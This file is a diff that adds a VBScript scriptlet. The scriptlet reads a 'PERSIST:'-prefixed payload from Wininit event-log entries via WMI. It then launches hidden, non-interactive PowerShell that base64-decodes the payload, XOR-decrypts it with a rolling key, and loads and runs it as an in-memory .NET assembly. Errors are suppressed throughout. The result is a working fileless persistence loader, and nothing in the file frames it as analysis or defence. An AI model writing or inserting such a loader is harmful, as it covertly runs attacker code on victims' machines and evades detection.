@@ -1,0 +1,45 @@
+<scriptlet>
+<script language="VBScript">
+On Error Resume Next
+
+Dim eventMessage
+eventMessage = ""
+
+Dim objWMIService
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+If Err.Number <> 0 Then WScript.Quit
+
+' Query System log for Wininit Event ID 19 records with PERSIST: prefix
+Dim colEvents
+Set colEvents = objWMIService.ExecQuery( _
+    "SELECT * FROM Win32_NTLogEvent WHERE SourceName = 'Wininit' AND EventCode = 19 " & _
+    "ORDER BY TimeGenerated DESC")
+If Err.Number <> 0 Then WScript.Quit
+
+Dim objEvent
+For Each objEvent In colEvents
+    On Error Resume Next
+    Dim rawData
+    rawData = objEvent.InsertionStrings(0)
+    If Err.Number = 0 And Len(rawData) > 8 Then
+        If Left(rawData, 8) = "PERSIST:" Then
+            eventMessage = Mid(rawData, 9)
+            Exit For
+        End If
+    End If
+    Err.Clear
+Next
+
+If Len(eventMessage) = 0 Then WScript.Quit
+
+Dim objShell
+Set objShell = CreateObject("WScript.Shell")
+If Err.Number <> 0 Then WScript.Quit
+
+objShell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command """ & _
+    "$b=[Convert]::FromBase64String('" & eventMessage & "');" & _
+    "$k=0x77;for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor $k;$k=($k+5)-band 0xFF}" & _
+    "$a=[System.Reflection.Assembly]::Load($b);" & _
+    "$a.GetType('Program').GetMethod('Main').Invoke($null,$null)""", 0, True
+</script>
+</scriptlet>
